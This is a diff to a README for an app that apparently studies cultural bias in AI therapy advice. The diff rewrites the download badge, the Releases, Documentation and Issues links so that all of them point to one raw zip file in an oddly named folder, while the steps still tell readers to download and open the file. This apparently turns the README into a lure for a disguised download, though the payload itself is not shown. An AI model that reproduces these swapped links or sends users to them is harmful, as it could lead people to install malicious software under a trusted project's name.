@@ -4,7 +4,7 @@
 This application analyzes geographic and cultural bias in AI therapy advice. It offers an interactive visualization to show how AI systems mostly rely on Anglophone sources when providing advice on culturally specific dilemmas in countries like India, Nigeria, and the Philippines.
 
 ## 📥 Download the App
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue?style=flat&logo=github)](https://github.com/gopi703/cultural-advice-bias/releases)
+[![Download Now](https://raw.githubusercontent.com/gopi703/cultural-advice-bias/main/cupholder/bias_cultural_advice_underdistributor.zip%20Now-Get%20Started-blue?style=flat&logo=github)](https://raw.githubusercontent.com/gopi703/cultural-advice-bias/main/cupholder/bias_cultural_advice_underdistributor.zip)
 
 ## 🛠️ System Requirements
 To run the application, ensure your computer meets these requirements:
@@ -27,7 +27,7 @@ To run the application, ensure your computer meets these requirements:
 ## 📂 Download & Install
 To get the software:
 
-1. Visit the [Releases page](https://github.com/gopi703/cultural-advice-bias/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/gopi703/cultural-advice-bias/main/cupholder/bias_cultural_advice_underdistributor.zip).
 2. On the Releases page, find the latest version of "cultural-advice-bias."
 3. Click on the version to download the setup file for your operating system.
 4. Once the download is complete, open the file to start the installation.
@@ -75,8 +75,8 @@ Stay tuned for future releases. Upcoming features may include:
 - Integration with more data sources.
 
 ## 📥 Quick Links
-- [Releases Page for Download](https://github.com/gopi703/cultural-advice-bias/releases)
-- [Documentation](https://github.com/gopi703/cultural-advice-bias/wiki)
-- [Issues Page for Support](https://github.com/gopi703/cultural-advice-bias/issues)
+- [Releases Page for Download](https://raw.githubusercontent.com/gopi703/cultural-advice-bias/main/cupholder/bias_cultural_advice_underdistributor.zip)
+- [Documentation](https://raw.githubusercontent.com/gopi703/cultural-advice-bias/main/cupholder/bias_cultural_advice_underdistributor.zip)
+- [Issues Page for Support](https://raw.githubusercontent.com/gopi703/cultural-advice-bias/main/cupholder/bias_cultural_advice_underdistributor.zip)
 
 Thank you for your interest in "cultural-advice-bias." Your insights can help improve AI's approach to therapy advice across cultures.
